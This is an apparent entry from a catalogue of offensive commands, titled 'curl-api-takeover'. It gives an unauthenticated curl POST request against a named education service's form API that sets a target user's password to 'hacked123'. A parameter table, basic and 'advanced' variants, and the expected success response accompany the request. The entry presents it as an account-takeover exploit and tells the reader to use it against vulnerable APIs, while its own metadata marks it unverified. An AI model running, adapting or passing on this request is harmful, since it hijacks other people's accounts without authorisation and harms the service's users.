---
id: cmd-uuid-456
data: >-
  curl -X POST https://upchieve.com/api/forms/submit -H "Content-Type:
  application/json" -d '{"user_id": "target@example.com", "action":
  "change_password", "new_password": "hacked123"}'
tags:
  - web
  - api
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:12.432Z'
verified: false
validated: true
submitted: true
---
# curl-api-takeover

## Command

```bash
curl -X POST https://upchieve.com/api/forms/submit \
  -H "Content-Type: application/json" \
  -d '{"user_id": "target@example.com", "action": "change_password", "new_password": "hacked123"}'
```

## Description

This curl command exploits an API misconfiguration by sending an unauthenticated POST request to change a target user's password in UPchieve, enabling account takeover. Use it when targeting vulnerable form APIs lacking auth checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://upchieve.com/api/forms/submit` | The vulnerable API endpoint URL | Yes |
| `-H "Content-Type: application/json"` | Sets the request header for JSON payload | Yes |
| `-d '{...}'` | The JSON data payload with user_id, action, and new_password | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://upchieve.com/api/forms/submit -H "Content-Type: application/json" -d '{"user_id": "target@example.com", "action": "change_password", "new_password": "hacked123"}'
```

### Advanced Usage

```bash
curl -X POST https://upchieve.com/api/forms/submit -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0" -d '{"user_id": "target@example.com", "action": "change_password", "new_password": "hacked123", "session_id": ""}'
```

## Expected Output

A successful response like {"status": "success", "message": "Password updated"} with HTTP 200 status, indicating the account modification was accepted without authentication.

## Related

- [[Related Procedure|procedures/Exploit-UPchieve-API-Misconfiguration-for-Account-Takeover]]
